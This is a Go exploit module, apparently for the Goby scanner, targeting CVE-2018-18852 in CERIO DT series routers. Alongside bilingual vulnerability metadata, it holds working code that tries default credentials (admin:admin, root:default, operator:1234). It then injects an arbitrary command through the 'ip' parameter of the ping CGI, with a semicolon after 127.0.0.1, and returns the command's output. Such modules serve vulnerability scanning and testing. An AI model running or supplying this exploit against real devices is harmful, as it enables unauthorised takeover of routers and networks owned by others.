package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "CERIO DT Series Routers Command Execution Vulnerability",
    "Description": "<p>CERIO DT series router is a wireless router from Taiwan Zhiding Information (CERIO) company.</p><p>CERIO DT series routers have an operation command injection vulnerability in certain versions. An attacker could exploit this vulnerability to execute the ping command.</p>",
    "Product": "CERIO-DT",
    "Homepage": "https://www.cerio.com.tw/",
    "DisclosureDate": "2019-06-18",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "title=\"DT-100G-N\"||title=\"DT-300N\"||title=\"DT-100G\"||title=\"AMR-3204G\"||title=\"WMR-200N\"",
    "GobyQuery": "title=\"DT-100G-N\"||title=\"DT-300N\"||title=\"DT-100G\"||title=\"AMR-3204G\"||title=\"WMR-200N\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's homepage or reference website at any time to obtain solutions:</p><p><a href=\"https://www.cerio.com.tw/\">https://www.cerio.com.tw/</a></p>",
    "References": [
        "https://github.com/hook-s3c/CVE-2018-18852"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2018-18852"
    ],
    "CNNVD": [
        "CNNVD-201906-698"
    ],
    "CNVD": [],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "CERIO DT系列路由器命令执行漏洞",
            "Product": "CERIO-DT",
            "Description": "<p>CERIO DT系列路由器是中国台湾智鼎资讯（CERIO）公司的一款无线路由器。</p><p>CERIO DT系列路由器在特定版本中存在操作命令注入漏洞。攻击者可利用该漏洞执行ping命令。</p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：</p><p><a href=\"https://www.cerio.com.tw/\">https://www.cerio.com.tw/</a></p>",
            "Impact": "<p>\t攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "CERIO DT Series Routers Command Execution Vulnerability",
            "Product": "CERIO-DT",
            "Description": "<p>CERIO DT series router is a wireless router from Taiwan Zhiding Information (CERIO) company.</p><p>CERIO DT series routers have an operation command injection vulnerability in certain versions. An attacker could exploit this vulnerability to execute the ping command.</p>",
            "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's homepage or reference website at any time to obtain solutions:</p><p><a href=\"https://www.cerio.com.tw/\">https://www.cerio.com.tw/</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`
	getTokenwiojdjklfg := func(u *httpclient.FixUrl,userinfo string) string {
		payload := "{'cgi': 'PING', 'mode': 9}"
		uri := "/cgi-bin/Save.cgi?cgi=PING"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Header.Store("Authorization", fmt.Sprintf("Basic %s",userinfo))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = payload
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			if resp.StatusCode == 200 {
				return resp.Utf8Html
			}
		}

		return ""
	}

	doLoginpsdamg := func(u *httpclient.FixUrl, userinfo string) string {
		uri := "/cgi-bin/index.cgi?cgi=STATUS_FIXED_JSON"
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
		cfg.Header.Store("Authorization", fmt.Sprintf("Basic %s",userinfo))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u,cfg); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `info`){
				return userinfo
			}
		}
		return ""
	}

	doExeczjsifjam := func(u *httpclient.FixUrl,pid,cmd,userinfo string) string{
		uri := "/cgi-bin/Save.cgi?cgi=PING"
		payload := fmt.Sprintf("pid=%s&ip=127.0.0.1;%s&times=1",pid,cmd)
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Header.Store("Authorization", fmt.Sprintf("Basic %s",userinfo))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = payload
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			if resp.StatusCode == 200 {
				return resp.Utf8Html
			}
		}
		return ""
	}


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			users := []string{"admin:admin","root:default","operator:1234"}
			cmd := `id`
			for i := 0; i < len(users); i++ {
				userinfo := users[i]
				userinfo = base64.StdEncoding.EncodeToString([]byte(userinfo))
				if user := doLoginpsdamg(u,userinfo); len(user) > 0 {
					if pid := getTokenwiojdjklfg (u,user); len(pid)>0 {
						if html := doExeczjsifjam(u,pid,cmd,userinfo);len(html) >0 {
							return strings.Contains(html,`uid=`)
						}
					}
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			users := []string{"admin:admin","root:default","operator:1234"}
			cmd := ss.Params["cmd"].(string)
			for i := 0; i < len(users); i++ {
				userinfo := users[i]
				userinfo = base64.StdEncoding.EncodeToString([]byte(userinfo))
				if user := doLoginpsdamg(expResult.HostInfo,userinfo); len(user) > 0 {
					if pid := getTokenwiojdjklfg (expResult.HostInfo,user); len(pid)>0 {
						if html := doExeczjsifjam(expResult.HostInfo,pid,cmd,userinfo);len(html) >0 {
							expResult.Success = true
							execResult := strings.Split(html,`text/html`)[1]
							expResult.Output = execResult
						}
					}
				}
			}



			return expResult
		},
	))
}